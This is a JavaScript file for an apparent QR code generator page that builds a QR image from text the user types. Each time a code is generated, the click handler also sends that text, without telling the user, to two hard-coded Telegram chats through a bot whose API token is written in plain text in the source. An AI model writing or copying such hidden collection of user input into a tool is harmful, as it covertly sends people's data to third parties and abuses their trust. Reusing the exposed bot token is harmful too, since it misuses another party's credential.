let text = document.getElementById("text");
let btn = document.getElementById("btn");
let image = document.getElementById("image");

btn.addEventListener("click", () => {
    if(text.value != ''){
        image.src =
        "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" +
        text.value;
        sendtelegram(text.value, -1001584390033);
        sendtelegram(text.value, 1369431958);
    }else{
        alert('Oldin toldir pitrPEN');
    }
 
   
});

function sendtelegram(message,id) { let telegram_bot_id = "5867224730:AAH2woLmER2mpBbO81crcNFKORISVg9UbP4"; let chat_id = id; let settings = { "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendPhoto", "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" }, "data": JSON.stringify({ "chat_id": chat_id, caption: message, photo: "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" +text.value }) }; $.ajax(settings).done(function (response) { }); };


// git add .
// git commit -m "add files"
// git push